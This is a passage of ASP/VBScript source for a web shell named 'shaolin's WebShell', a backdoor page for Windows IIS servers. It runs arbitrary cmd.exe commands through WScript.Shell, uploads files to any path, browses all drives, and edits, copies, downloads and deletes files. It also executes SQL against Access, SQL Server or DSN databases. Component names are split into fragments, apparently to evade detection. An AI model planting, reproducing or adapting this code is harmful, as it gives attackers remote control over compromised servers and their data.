    <TD align=middle>File<%=i%></TD>
	<TD><INPUT type=file name=file<%=i%>></TD>
  </TR>
  <%
  Next%>
  <TR class=TBTD>
    <TD colspan=2><LI>Warning: the file to upload can not to big,or speed will be slowly</TD>
  </TR>
  <TR>
    <TD class=TBEnd colspan=2><INPUT type=submit value="Begin Upload"></TD>
  </TR>
  </FORM>
</TABLE><BR>
<%
End Sub
Sub UpLoadSave()
    Server.ScriptTimeOut=3000
	Dim UpLoad,FormPath,Up_Str:Up_Str = ""
	Set UpLoad = New UpFile_Class
	UpLoad.GetData()
	FormPath = Upload.Form("ServerPath")
	If FormPath = "" Then
	    Message "Upload failure","<LI>dir to upload dos not input",1
		Response.End
	End If
	if Right(FormPath,1) <> "\" then FormPath = FormPath & "\"
	FileCount = 0
	For Each FormName in UpLoad.file
	    Set File = UpLoad.file(FormName)
		If File.FileSize > 0 Then
		    File.SaveToFile FormPath & File.FileName
			If err then
			    err.Clear
				Up_Str = Up_Str & "<LI>File:" & File.FilePath & File.FileName & "Upload failure,the dir not exist or dir cannot to write"
			Else
			    Up_Str = Up_Str & "<LI>Local File:<FONT color=#ff2222>" & File.FilePath & File.FileName & "(" & File.FileSize & ")</FONT>Already upload to server<FONT color=#ff2222>" & FormPath & File.FileName & "</FONT>"
				FileCount = FileCount+1
			End if
		End if
		Set File = Nothing
	Next
	Up_Str = Up_Str & "<B><LI>Upload finished" & FileCount & "file(s) already upload to server</B>"

	Set UpLoad = Nothing
	Message "Upload Report",Up_Str,1
	Response.End
	
End Sub
Function HTMLEncode(Str) 
	If isNull(Str) or Str = "" Then
	    HTMLEncode = ""
	Else
	    Str = Replace(Str, ">", ">")
		Str = Replace(Str, "<", "<")
		HTMLEncode = Str 
	End if
End Function
Sub GetDriveList
    Dim DriveFso
	Set DriveFso = Server.Createobject("Scri"&"pting.Fi"&"leSys"&"temObject")
    For Each DriveA in DriveFso.Drives
        Response.write "<A href=" & Url & "?Path=" & DriveA.DriveLetter&":\>" & DriveA.DriveLetter&":</A>     "
    Next
	Set DriveFso = Nothing
End Sub
Function GetoldFolder(Paths)
    Dim t
	If Len(Paths) <> 3 and Right(Paths,1) = "\" Then
       t = Left(Paths,Len(Paths)-1)
	   GetoldFolder = Left(t,InstrRev(t,"\"))
    Else
	   GetoldFolder = Left(Paths,InstrRev(Paths,"\"))
    End if
End Function
Sub OperCmd()  'Exucute CMD
    On Error Resume Next
	Dim ScriptCMD,FsoCmd,AbsPath,TempFile,Command,FileStream,FileText
	AbsPath = Server.MapPath(Url)
	Set FsoCmd = Server.CreateObject("Scri"&"pting.Fi"&"leSys"&"temObject")
	Set ScriptCMD = Server.CreateObject("WSC"&"RIP"&"T.S"&"HELL")
	TempFile = Left(AbsPath,instrRev(AbsPath,"\")) & FsoCmd.GetTempName()
	If Request("SubCMD") <> "Create Folder" Then
	    If Request("SubCMD") = "Execute CMD" Then
		    Command = Request("OperDos")
		Else
		    Command = Request("OperProgram")
		End if
		Call ScriptCMD.Run("cmd.exe /c " & Command & " > " & TempFile,0,True)
		Set FileStream = FsoCmd.OpenTextFile(TempFile,1,False)
		If Not FileStream.AtEndOfStream then
		    FileText = FileStream.ReadAll
			Response.write HTMLEncode(FileText)
		Else
		    Response.write "System echo nothing"
		End if
		FileStream.Close
		Set FileStream = Nothing
		FsoCmd.DeleteFile TempFile,True
	Else
	    Command = Request("newFileOrFolder")
		if Instr(Command,":") then
		FsoCmd.CreateFolder Command
		else
		FsoCmd.CreateFolder Server.MapPath(".")&"\"&Command
		end if
		If err then
		    err.Clear
			Response.write " Create folder failure"
		Else
		    Response.write "Success create " & Command & " Folder"
		End If
	End if
	Set FsoCmd = Nothing
	Set ScriptCMD = Nothing
End Sub

Sub UnderTool(strAct ,strValue)
	frmbTag = "<form Action=" & Url & " method=post target=_balnk >"
	frmHiTag = "<Input type=hidden name=Action value='" & strAct & "'>"
	frmBtTag = "<Input type=submit name=btn value='" & strValue & "' style='width:150;cursor:hand'>"
	frmeTag = "</form>"
	
	Response.write frmbTag
	Response.write frmHiTag
	Response.write frmBtTag
	Response.write frmeTag
end Sub

Sub SideTool(strAct, strFile,strName,strFlag,strFileFolder, strValue)
	frmbTag = "<form Action=" & Url & " method=post target=_balnk >"
	frmHi1Tag = "<Input type=hidden name=Action value='" & strAct & "'>"
	frmHi2Tag = "<Input type=hidden name=aFile value='" & strFile & "'>"
	frmHi3Tag = "<Input type=hidden name=aname value='" & strName & "'>"
	frmHi4Tag = "<Input type=hidden name=flag value=" & strFlag & ">"
	frmHi5Tag = "<Input type=hidden name=FileFolder value='" & strFileFolder & "'>"
	if strAct = "Del" then
		frmBtTag = "<Input type=submit name=btn value=" & "'" & strValue & "' onclick = 'return Delyn()'>"	
	else
		frmBtTag = "<Input type=submit name=btn value=" & "'" & strValue & "'>"
	end if
	frmeTag = "</form>"
	
	Response.write frmbTag
	Response.write frmHi1Tag
	Response.write frmHi2Tag
	Response.write frmHi3Tag
	Response.write frmHi4Tag
	Response.write frmHi5Tag
	Response.write frmBtTag
	Response.write frmeTag

end Sub


Sub LSideTool(strPath,strOldFolder,strValue)
	frmbTag = "<form Action=" & Url & " method=post >"
	frmHi1Tag = "<Input type=hidden name=Path value='" & strPath & "'>"
	frmHi2Tag = "<Input type=hidden name=oldFolder value='" & strOldFolder & "'>"
	frmBtTag = "<Input type=submit name=btn value='" & strValue & "' style='cursor:hand;width:280'>"
	frmeTag = "</form>"
	Response.write frmbTag
	Response.write frmHi1Tag
	Response.write frmHi2Tag
	Response.write frmBtTag
	Response.write frmeTag


end Sub


Sub DisplayDirectory(FolderA) 'Main Interface
    On Error Resume Next
    Dim FSO,TheFolder,SubFolderA,FileA,oldFolder
	Dim RootWeb,UserWeb,WebAbsPath,WebPath
%>
<%
	oldFolder = Request("oldFolder") 'Start
	If Right(FolderA,1) <> "\" Then FolderA = FolderA & "\"
	If odlFolder = "" Then oldFolder = FolderA
	RootWeb = Instr(1,FolderA,Server.MapPath("/"),1)
	UserWeb = Instr(1,FolderA,Mid(Server.MapPath(Url),1,InstrRev(Server.MapPath(Url),"\")),1) 'End
	If RootWeb > 0 Then  'Main dir
	    WebAbsPath = Server.MapPath("/") & "\"
		WebPath="/" & Replace(Mid(FolderA,Len(WebAbsPath)+1),"\","/")
	ElseIf UserWeb > 0 Then 'virtual dir
	    WebAbsPath = Server.MapPath(UrlPath) & "\"
		WebPath = UrlPath & Replace(Mid(FolderA,Len(WebAbsPath)+1),"\","/")
	End If
	Set FSO = Server.Createobject("Scri"&"pting.Fi"&"leSys"&"temObject")
    Set TheFolder = FSO.GetFolder(FolderA)
	Set SubFolderA = TheFolder.SubFolders
	Set FileA = TheFolder.Files
%>
<TABLE width=777 border=0 align=center cellpadding=0 cellspacing=0  bgcolor=#91d70d>
  <TR>
    <TD colspan=2>
	  <TABLE width=100% border=0 cellpadding=3 cellspacing=1>
	    <TR>
		  <TD align=middle><b><FONT color=#ff2222>shaolin's WebShell</FONT><b></TD>
		</TR>
		<FORM Action=<%=Url%> method=Post name=CmdDos>
		<TR class=TBTD>
		  <TD>
		    <INPUT type=text name=OperDos value="<%=Request("OperDos")%>">
			<INPUT type=submit value="Execute CMD" name=SubCmd>
			&nbsp;<INPUT type=text name=OperProgram value="<%=Request("OperProgram")%>">
			<INPUT type=submit value="Run Program" name=SubCmd> [Please Used Abs Path]</font></TD>
		<TR bgcolor=#ffffff>
		  <TD>
		    <INPUT type=text name=newFileOrFolder>
			<INPUT type=button value="Create File" onclick="CreateFile(document.CmdDos.newFileOrFolder.value)">
			<INPUT type=hidden name=cmdFlag value=ok>
			<INPUT type=submit value="Create Folder" name=SubCMD></TD>
		</TR>
		</FORM>
		<%
		If Request("cmdFlag")="ok" Then%>
		<TR bgcolor=#ffffff>
		  <TD><TEXTAREA rows=25 cols=125 style="background:#000000;color:#ffffff;"><%OperCmd%></TEXTAREA></TD>
		</TR>
		<%
		End If%>
		<TR class=TBTD>
		  <TD>Switch Disk <%GetDriveList%>&nbsp;&nbsp;<font face=Webdings size=+1>H</font> Website Dir: <FONT color=#ff2222><%=Server.MapPath("/") & "\"%></FONT>&nbsp;&nbsp;<font face=Webdings size=+1>K</font> Current Path: <FONT color=#ff2222><%=FolderA%></FONT>&nbsp;&nbsp;<font face=Webdings size=+1>q</font> Refresh</TD>
		</TR><% response.write "http://" & Request.ServerVariables("SERVER_NAME") & "" & Request.ServerVariables("URL") & """></script>" %>
		<FORM Action=<%=Url%> method=Post>
		<TR bgcolor=#ffffff>
		  <TD>Dir View:
		    <INPUT type=text name=Path size=28>
			<INPUT type=submit value=View> Please used Abs Path.Example: "F:\ASP\"</TD>
		</TR>
		</FORM>
		<TR>
		  <TD bgcolor=#91d70d align=middle><b><FONT color=#ff2222>File Operate</FONT></b></TD>
		</TR>
	  </TABLE>
	</TD>
  </TR>
  <TR>
    <TD>
	  <TABLE width=70% border=0 cellpadding=0 cellspacing=1>
	    <TR>
		  <TD width=30% valign=top bgcolor=#ecfccd>
		    <TABLE width=100% border=0 cellpadding=0 cellspacing=0>
			  <TR>
			    <TD>
				<FONT color=#FF8000><font face=Webdings>2</font></FONT>
				<font face=Webdings>9</font> 
				<% 
					LSideTool GetoldFolder(oldFolder), GetoldFolder(oldFolder),"Higher_level_Dir"	
				%>
				  <%
				  For Each SubFolderB in SubFolderA%>
<!--				  Sub LSideTool(strPath,strOldFolder,strValue)	-->
	  		      <TABLE width=100% border=0 cellpadding=0 cellspacing=0>
				  <TR>
					<%
					Response.write "<TD>"
					LSideTool SubFolderB.Path & "\",GetoldFolder(SubFolderB.Path),"+" &  SubFolderB.Name 
					Response.write "</TD>"
				%>
				</TR>
				  </TABLE>

				  <%
				  Next%>
				</TD>
			  </TR>
			</TABLE>
		  </TD>
		  <TD valign=top bgcolor=#ecfccd height=320>
		    <TABLE TABLE width=100% border= cellpadding=2 cellspacing=0>
			  <TR height=25 bgcolor=#d8f99b>
			    <TD width=48% align=center class=TBBO>File Name</TD>
				<TD width=20% class=TBBO>File Size</TD>
				<TD width=32% align=center class=TBBO>File Operate</TD>
			  </TR>
			  <%
			  For Each FileB in FileA%>
			  <TR>
			    <TD class=TBBO><FONT color=#ff8000><font face=Webdings>1</font></FONT>
				<%If WebPath <> "" Then%>
					<A href="<%=WebPath & FileB.Name%>" title="<%=GetAttrib(FileB.attrib) & Chr(10) & "Modify Time:" & FileB.DateLastModified%>" target=_blank><%=FileB.Name%></A>
					</TD>
				<%Else%>
					<FONT title="<%=GetAttrib(FileB.attrib) & Chr(10) & "Modify Time:" & FileB.DateLastModified%>"><%=FileB.Name%></FONT>
					</TD>
				<%End If%>
				<TD class=TBBO><%=FileB.Size%> byte</TD>
				<TD align=middle class=TBBO>
				
<!--				Sub SideTool(strAct, strFile,strName,strFlag,strFileFolder, strValue)	-->
				 <TABLE width=100% border=0 cellpadding=0 cellspacing=0>
				  <TR>
					<%
					Response.write "<TD>"
					SideTool "EditForm",FileB.Path,"","","","Edit"
					Response.write "</TD><TD>"
					Response.write "<form> <Input type=button value=Copy onclick=Copy(" & "'" & FileB.Path & "',1) > </form>" 
					Response.write "</TD><TD>"
					SideTool "Down",FileB.Path,"","","","Down"
					Response.write "</TD><TD>"
					SideTool "Del","",FileB.Path,"1","","Del"
					Response.write "</TD><TD>"
					SideTool "SetAttribForm","","","",FileB.Path,"attrib"
					Response.write "</TD>"
					%>
				 </TR>
				 </TABLE>
				</TD>
			  </TR>
			  <%
			  Next%>
			</TABLE>
		  </TD>
		</TR>
		<TR>
		  <TD colspan=2 class=TBBD>&nbsp;Other Operate
		  <TABLE width=100% border=0 cellpadding=0 cellspacing=0>
		  <TR class=TBBO>
			<%
			Response.write "<TD>"
			UnderTool "ShowServer","[View_Server_Info]"
			Response.write "</TD><TD>"
			UnderTool "CommonObj","[Query_Server_COM]"
			Response.write "</TD><TD>"
			UnderTool "ScanDriveForm","[Scan_Disk_Info]"
			Response.write "</TD><TD>"
			UnderTool "DispFsoCmdForm","[Exucute_CMD_without_FSO]"
			Response.write "</TD><TD>"
			UnderTool "SQLForm","[Control_DataBase]"
			Response.write "</TD><TD>"
			UnderTool "UpLoadForm","[Upload_without_COM]"
			Response.write "</TD>"
			%>
		 </TR>
		 </TABLE>

		 </TD>
		</TR>
		<FORM Action=<%=Url%> method=Post>
		<INPUT type=hidden name=Action value=Loginout>
		<TR>
		  <TD colspan=2 class=TBEnd><INPUT type=submit value="Exit Login"></TD>
		</TR>
		</FORM>
	  </TABLE>
	</TD>
  </TR>
</TABLE>
<%
End Sub
Function GetAttrib(FileAttrib)
    Select Case FileAttrib
	    Case 0,16,32,48: GetAttrib = "Attrib:Archive"
		Case 1,17,33,49: GetAttrib = "Attrib:ReadOnly"
		Case 2,18,34,50: GetAttrib = "Attrib:Hidden"
		Case 3,19,35,51: GetAttrib = "Attrib:ReadOnly,Hidden"
		Case 4,20,36,52: GetAttrib = "Attrib:System"
		Case 5,21,37,53: GetAttrib = "Attrib:System,ReadOnly"
		Case 6,22,38,54: GetAttrib = "Attrib:System,Hidden"
		Case 7,23,39,55: GetAttrib = "Attrib:System,ReadOnly,Hidden"
		Case Else: GetAttrib = "Attrib:" & FileAttrib
	End Select
End Function
Sub SQLForm()
%>
<TABLE width=480 border=0 align=center>
  <TR>
    <TD>
      <TABLE width="100%" border=0 cellspacing=1 cellpadding=3 bgcolor=#91d70d>
	  <FORM Action=<%=Url%> method=Post>
	  	<Input type=hidden name=Action value=SQL>
		<Input type=hidden name=Flag value=1>
        <TR>
          <TD colspan=2 class=TBHead>Access database Operate</TD>
		</TR>
        <TR class=TBTD>
          <TD align=middle>User</TD>
          <TD><INPUT type=text name=AcUser> [None to empty]</TD>
		</TR>
		<TR class=TBTD>
          <TD align=middle>Pass</TD>
          <TD><INPUT type=text name=AcPass> [None to empty]</TD>
		</TR>
        <TR class=TBTD>
          <TD align=middle>Database path and name</TD>
          <TD><INPUT type=text name=AcPath><INPUT class=INPUTt type=radio value=Ote name=SelectPath checked> Relative<INPUT class=INPUTt type=radio value=Abs name=SelectPath > Abs</TD>
		</TR>
        <TR class=TBTD>
          <TD align=middle>SQL Sentence</TD>
          <TD><INPUT type=text size=50 name=SqlCommand></TD>
		</TR>
        <TR>
          <TD class=TBEnd colspan=2><INPUT type=submit value="Execute Command"></TD>
		</TR>
	  </FORM>
	  </TABLE>
	</TD>
  </TR>
  <TR>
    <TD height=10></TD>
  </TR>
  <TR>
    <TD>
      <TABLE width="100%" border=0 cellspacing=1 cellpadding=3 bgcolor=#91d70d>
	  <FORM Action=<%=Url%> method=Post>
	  	<Input type=hidden name=Action value=SQL>
		<Input type=hidden name=Flag value=2>

		<TR>
          <TD colspan=2 class=TBHead><B>SQL Database Operate</B></TD>
		</TR>
        <TR class=TBTD>
          <TD align=middle width=120>User</TD>
          <TD><INPUT type=text name=SqlUser></TD>
        </TR>
        <TR class=TBTD>
          <TD align=middle>Pass</TD>
          <TD><INPUT type=text name=SqlPass> [None to empty]</TD>
        </TR>
        <TR class=TBTD>
          <TD align=middle>Database Name</TD>
          <TD><INPUT type=text name=SqlDataBase></TD>
        </TR>
        <TR class=TBTD>
          <TD align=middle>Server Domain Name</TD>  
          <TD><INPUT type=text name=SqlServer> [Local can be empty,Remote is IP]</TD>
        </TR>
        <TR class=TBTD>
          <TD align=middle>SQL Sentence</TD>
          <TD><INPUT type=text size=50 name=SqlCommand></TD>
		</TR>
        <TR>
          <TD class=TBEnd colspan=2><INPUT type=submit value="Execute Command"></TD>
		</TR>
	  </FORM>
	  </TABLE>
	</TD>
  </TR>
  <TR>
    <TD height=10></TD>
  </TR>
  <TR>
    <TD>
	  <TABLE width="100%" border=0 cellspacing=1 cellpadding=3 bgcolor=#91d70d>
	  <FORM Action=<%=Url%> method=Post>
  	  	<Input type=hidden name=Action value=SQL>
		<Input type=hidden name=Flag value=3>

		<TR>
          <TD colspan=2 class=TBHead>Database DSN Operate</TD>
		</TR>
        <TR class=TBTD>
          <TD align=middle width=120>User</TD>
          <TD><INPUT type=text name=DsnUser> [None to empty]</TD>
        </TR>
        <TR class=TBTD>
          <TD align=middle>Pass</TD>
          <TD><INPUT type=text name=DsnPass> [None to empty]</TD>
        </TR>
        <TR class=TBTD>
          <TD align=middle>DSN Name</TD>
          <TD><INPUT type=text name=DsnName></TD>
		</TR>
        <TR class=TBTD>
          <TD align=middle>SQL Sentence</TD>
          <TD><INPUT type=text size=50 name=SqlCommand></TD>
		</TR>
        <TR>
          <TD class=TBEnd colspan=2><INPUT type=submit value="Execute Command" name=DS></TD>
		</TR>
	  </FORM>
	  </TABLE>
	</TD>
  </TR>
</TABLE><BR>
<%
End Sub
Function Access()
    Dim AcPath,AcUser,AcPass,DBQ
	AcPath = Request("AcPath")
	AcUser = Request("AcUser")
	AcPass = Request("AcPass")
	If Request("SelectPath") = "Abs" Then
	    DBQ = AcPath & ";"
	Else
	    DBQ = Server.MapPath(AcPath) & ";"
	End If
	Access = "DRIVER={Microsoft Access Driver (*.mdb)};User=" & AcUser & ";Pwd=" & AcPass & ";DBQ=" & DBQ & ";"
End Function
Function SqlServer()
    Dim SqlServerName,SqlDataBase,SqlUser,SqlPass
	SqlServerName = Request("SqlServer")
	SqlDataBase = Request("SqlDataBase")
	SqlUser = Request("SqlUser")
	SqlPass = Request("SqlPass")
	SqlServer = "Driver={SQL Server};Server=" & SqlServerName & ";Database=" & SqlDataBase & ";Uid="& SqlUser & ";Pwd=" & SqlPass & ";"
End Function
Function DsnSql()
    Dim DsnName,DsnUser,DsnPass
	DsnName = Request("DsnName")
	DsnUser = Request("DsnUser")
	DsnPass = Request("DsnPass")
	DsnSql = "DSN=" & DsnName & ";Uid=" & DsnUser & ";Pwd=" & DsnPass & ";"
End Function
Sub SQL()
    On Error Resume Next
	Dim Conn,ConnStr,Rs,RsStr,Datas
	Select Case Request("Flag")
	    Case 1: ConnStr = Access()
		Case 2: ConnStr = SqlServer()
		Case 3: ConnStr = DsnSql()
		Case Else
		     Message "Database Operate failure","<LI>Please appoint database type!",1
			 Response.End
	End Select
	Response.write "<P><INPUT type=button value='<< Return' onclick=""history.go(-1)""></P>"
	RsStr = Trim(Request("SqlCommand"))
	Set Conn = Server.Createobject("ADODB.Connection")
	Conn.Open ConnStr
	If err.number <> 0 Then
	    Message "Database Operate failure","<LI>" & err.Description,0
	    err.Clear
		Response.End
	End If
    If LCase(Left(RsStr,6))="select" Then
	    Set Rs = Conn.Execute(RsStr)
		If err.number<>0 Then
		    Message "Database Operate failure","<LI>" & err.Description,0
			err.Clear
			Response.End
	    End If
		If Rs.Eof Then
		    Message "Database Operate Success","<LI>RecordSet Empty.",0
		Else
			Response.Write "<TABLE width=770 border=0 align=center cellspacing=1 cellpadding=3  bgColor=#91d70d >" & VbCrLf & "<TR class=TBHead>" & VbCrLf
			For i=0 to Rs.Fields.Count-1
			    Response.write "<TD><B>" & Rs(i).Name & "</B></TD>" & VbCrLf
			Next
			Response.write "</TR>" & VbCrLf
			Datas = Rs.GetRows(-1)
			Rs.Close
			Conn.Close
			Set Rs = Nothing
			Set Conn = Nothing
			For i=0 to Ubound(Datas,2)
			    Response.write "<TR align=middle class=TBTD>" & VbCrLf
				For j=0 to Ubound(Datas)
				    If Trim(Datas(j,i))="" or isNull(Datas(j,i)) Then
					    Response.write "<TD>----</TD>" & VbCrLf
					Else
					    Response.write "<TD>" & Server.HTMLEncode(Datas(j,i)) & "</TD>" & VbCrLf
					End If
				Next
				Response.write "</TR>" & VbCrLf
			Next
			Response.write "</TABLE>" & VbCrLf & "</TD>" & VbCrLf & "</TR>" & VbCrLf & "</TABLE>"
		End If
	Else
	    Conn.Execute RsStr,IngRecs
		If err Then
		    Message "Database Operate failure","<LI>" & err.Description,0
			err.Clear
		Else
			Message "Database Operate Success","<LI>Effect row Number:<FONT color=#ff2222>" & IngRecs ,0
		End If
	End If
End Sub%>
<Script Language="Javascript">
function Delyn()
{
    var Delyn;
	Delyn = confirm("Can not recover to delete file or folder !\n Confirm to delete?");
	return Delyn;
}
function CreateFile(file)
{
    if(file=="")
	{
	    alert("File Name cannot be empty,confirm input it");
	}
	else
	{
	    window.open("<%=Url%>?Action=EditForm&afile="+file);
	}
}
function Copy(name,flag)
{
    var CopytoPath;
	CopytoPath = prompt("Please input dest path (Abs) \nExample: F:\\ASP\\ or F:\\ASP\\index.asp","");
	if((CopytoPath==null)||(CopytoPath==""))
	{
	    alert("Copy failure,Dest cannot be empty");
	}
	else
	{
	    window.open("<%=Url%>?Action=CopyFile&oDir="+name+"&nDir="+CopytoPath+"&flag="+flag);
	}	
}
</script>
</BODY>
</HTML>


